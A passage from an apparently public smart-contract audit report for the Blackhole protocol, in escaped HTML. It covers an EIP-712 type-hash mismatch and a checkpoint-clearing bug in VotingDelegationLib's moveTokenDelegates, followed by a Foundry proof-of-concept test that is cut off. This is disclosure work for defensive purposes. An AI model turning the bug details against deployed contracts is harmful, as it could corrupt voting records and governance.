class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe problem is that the \u003ccode\u003eDOMAIN_TYPEHASH\u003c/code\u003e does \u003cstrong\u003enot\u003c/strong\u003e include the \u003ccode\u003eversion\u003c/code\u003e parameter, but the contract still tries to encode it. This creates a mismatch between the type hash and the actual encoding, which will lead to incorrect \u003ccode\u003edigest\u003c/code\u003e hashes when signing or verifying messages.\u003c/p\u003e\n\u003ch3 id=\"impact-10\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUsers will be unable to sign or verify messages using the EIP-712 delegation feature.\u003c/li\u003e\n\u003cli\u003eDelegation by signature (\u003ccode\u003edelegateBySig\u003c/code\u003e) will always fail due to signature mismatch.\u003c/li\u003e\n\u003cli\u003eGovernance features relying on off-chain signatures will break.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the \u003ccode\u003eDOMAIN_TYPEHASH\u003c/code\u003e to include the \u003ccode\u003eversion\u003c/code\u003e field so that it matches the data structure used in the actual \u003ccode\u003edomainSeparator\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOMAIN_TYPEHASH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis change ensures the type hash includes all the fields being encoded and fixes the signature validation logic.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"governor\" style=\"position:relative;\"\u003e\u003ca href=\"#governor\" aria-label=\"governor permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"#governor\"\u003eGovernor\u003c/a\u003e\u003c/h1\u003e\n\u003ch1 id=\"medium-risk-findings-9\" style=\"position:relative;\"\u003e\u003ca href=\"#medium-risk-findings-9\" aria-label=\"medium risk findings 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (9)\u003c/h1\u003e\n\u003ch2 id=\"m-14-checkpoints-are-incorrectly-cleared-during-transferfrom\" style=\"position:relative;\"\u003e\u003ca href=\"#m-14-checkpoints-are-incorrectly-cleared-during-transferfrom\" aria-label=\"m 14 checkpoints are incorrectly cleared during transferfrom permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-153\"\u003e[M-14] Checkpoints are incorrectly cleared during \u003ccode\u003etransferFrom\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-236\"\u003erashmor\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/libraries/VotingDelegationLib.sol#L46-L110\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/libraries/VotingDelegationLib.sol#L46-L110\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-3\" aria-label=\"finding description and impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eVotingEscrow\u003c/code\u003e contract, the \u003ccode\u003etransferFrom\u003c/code\u003e function delegates to \u003ccode\u003e_transferFrom\u003c/code\u003e, which in turn calls \u003ccode\u003emoveTokenDelegates\u003c/code\u003e from \u003ccode\u003eVotingDelegationLib\u003c/code\u003e. This function is responsible for updating historical checkpoints that track which token IDs were delegated to which addresses.\u003c/p\u003e\n\u003cp\u003eDuring this process, a flaw occurs in the cleanup logic for the source representative (\u003ccode\u003esrcRep\u003c/code\u003e). Specifically, when \u003ccode\u003e_isCheckpointInNewBlock == false\u003c/code\u003e, the function attempts to mutate the existing checkpoint array (\u003ccode\u003esrcRepNew\u003c/code\u003e) in-place by removing any token ID that no longer belongs to \u003ccode\u003esrcRep\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"59\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eif (ownerOfFn(tId) != srcRep) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    srcRepNew[i] = srcRepNew[length - 1];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    srcRepNew.pop();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    length--;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} else {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    i++;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe problem arises because, by the time \u003ccode\u003emoveTokenDelegates\u003c/code\u003e is called, the \u003ccode\u003etransferFrom\u003c/code\u003e flow has already invoked \u003ccode\u003e_removeTokenFrom()\u003c/code\u003e, which sets the owner of the token being transferred to \u003ccode\u003eaddress(0)\u003c/code\u003e. As a result, \u003ccode\u003eownerOfFn(tId)\u003c/code\u003e will return \u003ccode\u003e0x0\u003c/code\u003e for the token being transferred.\u003c/p\u003e\n\u003cp\u003eThis means the above condition (\u003ccode\u003eownerOfFn(tId) != srcRep\u003c/code\u003e) will always be true for the token that was just transferred out, causing it to be removed from \u003ccode\u003esrcRepNew\u003c/code\u003e. But due to the in-place mutation without incrementing \u003ccode\u003ei\u003c/code\u003e, the same index is checked again after every pop, potentially skipping or corrupting the loop’s behavior basically clearing all checkpoints. This breaks the whole logic of checkpoints and other functions, depending on it.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThis is not the only vulnerability in this function, it may be appropriate to rewrite the whole logic.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-9\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {Test, console} from \u0026quot;forge-std/Test.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {Black} from \u0026quot;../src/Black.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {VotingEscrow} from \u0026quot;../src/VotingEscrow.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {BlackGovernor} from \u0026quot;../src/BlackGovernor.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {IBlackHoleVotes} from \u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {MinterUpgradeable} from \u0026quot;../src/MinterUpgradeable.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {GaugeManager} from \u0026quot;../src/GaugeManager.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {VotingDelegationLib} from \u0026quot;../src/libraries/VotingDelegationLib.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract MockContractDelegates {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    VotingDelegationLib.Data cpData;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public fromOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public toOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public fromDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public toDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    mapping(uint256 =\u0026gt; address) public idToOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    constructor(address _fromOwner, address _toOwner, address _fromDelegate, address _toDelegate) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        fromOwner = _fromOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        toOwner = _toOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        fromDelegate = _fromDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        toDelegate = _toDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function useMoveTokenDeledates(uint256 tokenId) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        idToOwner[tokenId] = address(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VotingDelegationLib.moveTokenDelegates(cpData, fromOwner, toOwner, tokenId, ownerOf);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function ownerOf(uint256 tokenId) public view returns (address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return idToOwner[tokenId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function modifyData(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address addr,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint32 num,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VotingDelegationLib.Checkpoint memory checkpoint,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint32 numCheckpoints\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        cpData.checkpoints[addr][num] = checkpoint;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        cpData.numCheckpoints[addr] = numCheckpoints;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function showData(address addr, uint32 num) public view returns (VotingDelegationLib.Checkpoint memory) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return cpData.checkpoints[addr][num];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function showNumberOfCheckPoints(address addr) public view returns (uint32) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return cpData.numCheckpoints[addr];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract MyTest3 is Test {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    MockContractDelegates public contractDelegates;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public owner = makeAddr(\u0026quot;owner\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public alice = makeAddr(\u0026quot;alice\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public aliceDelegate = makeAddr(\u0026quot;aliceDelegate\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public bob = makeAddr(\u0026quot;bob\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public bobDelegate = makeAddr(\u0026quot;bobDelegate\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function setUp() public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.warp(block.timestamp + 1000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.startPrank(owner);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates = new MockContractDelegates(alice, bob, aliceDelegate, bobDelegate);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256[] memory tokenIds = new uint256[](3);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenIds[0] = 1;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenIds[1] = 2;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenIds[2] = 3;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        VotingDelegationLib.Checkpoint memory checkpoint =\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            VotingDelegationLib.Checkpoint({timestamp: block.timestamp, tokenIds: tokenIds});\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates.modifyData(alice, 0, checkpoint, 1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.stopPrank();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function test__someTest3() public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.warp(block.timestamp + 100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan 